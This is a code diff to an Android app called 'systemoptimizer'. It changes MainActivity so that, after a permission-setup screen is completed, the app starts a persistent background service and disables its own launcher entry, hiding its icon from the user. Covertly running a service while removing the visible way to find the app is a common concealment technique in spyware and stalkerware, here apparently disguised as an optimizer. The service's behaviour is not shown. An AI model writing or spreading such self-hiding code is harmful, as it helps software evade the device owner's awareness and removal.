@@ -1,6 +1,8 @@
 package com.example.systemoptimizer
 
+import android.content.ComponentName
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.util.Log
 import androidx.activity.ComponentActivity
@@ -15,26 +17,64 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        Log.i(TAG, "MainActivity onCreate started")
+        Log.i(TAG, "MainActivity onCreate")
 
-        // Check if permission setup is complete
+        /*
+         * MainActivity is only the initial launcher/onboarding entry point.
+         * It should not remain visible in the launcher after setup.
+         */
+
         if (!PermissionCenterActivity.setupComplete(this)) {
-            Log.i(TAG, "Permission setup incomplete - Switching to PermissionCenterActivity")
-            startActivity(Intent(this, PermissionCenterActivity::class.java))
+            Log.i(TAG, "Setup incomplete -> opening PermissionCenter")
+            startActivity(
+                Intent(this, PermissionCenterActivity::class.java)
+            )
             finish()
             return
         }
 
-        // If setup is complete, start the service
-        Log.i(TAG, "Permission setup complete - Starting BackgroundService")
-        startApp()
+        /*
+         * Setup is already complete.
+         * Start the service and remove the launcher component.
+         */
+        Log.i(TAG, "Setup complete -> starting BackgroundService")
+
+        startBackgroundService()
+
+        disableLauncherComponent()
+
+        finish()
     }
 
-    private fun startApp() {
-        ContextCompat.startForegroundService(
-            this,
-            Intent(this, BackgroundService::class.java)
-        )
-        finish() // MainActivity is just a launcher
+    private fun startBackgroundService() {
+        try {
+            ContextCompat.startForegroundService(
+                this,
+                Intent(this, BackgroundService::class.java)
+            )
+
+            Log.i(TAG, "BackgroundService start requested")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start BackgroundService", e)
+        }
+    }
+
+    private fun disableLauncherComponent() {
+        try {
+            val component = ComponentName(
+                this,
+                MainActivity::class.java
+            )
+
+            packageManager.setComponentEnabledSetting(
+                component,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+
+            Log.i(TAG, "Launcher component disabled")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to disable launcher component", e)
+        }
     }
 }
